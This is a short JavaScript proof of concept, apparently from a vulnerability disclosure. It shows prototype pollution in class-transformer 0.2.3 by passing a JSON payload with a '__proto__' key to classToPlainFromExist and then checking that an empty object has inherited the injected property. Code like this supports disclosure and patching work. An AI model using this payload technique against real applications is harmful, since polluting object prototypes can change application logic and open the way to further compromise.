/**
 * class-transformer@0.2.3 is vulnerable to prototype pollution.
 * the pollution point is located in function classToPlainFromExist 
 * and classToClassFromExist in index.js.
 * for example, the function classToClassFromExist() can be exploited
 * by the following example.
 */
var root = require("class-transformer");
var payload = JSON.parse('{"__proto__": {"hjw": "jhu"}}');
root.classToPlainFromExist(payload,{});
console.log({}.hjw);

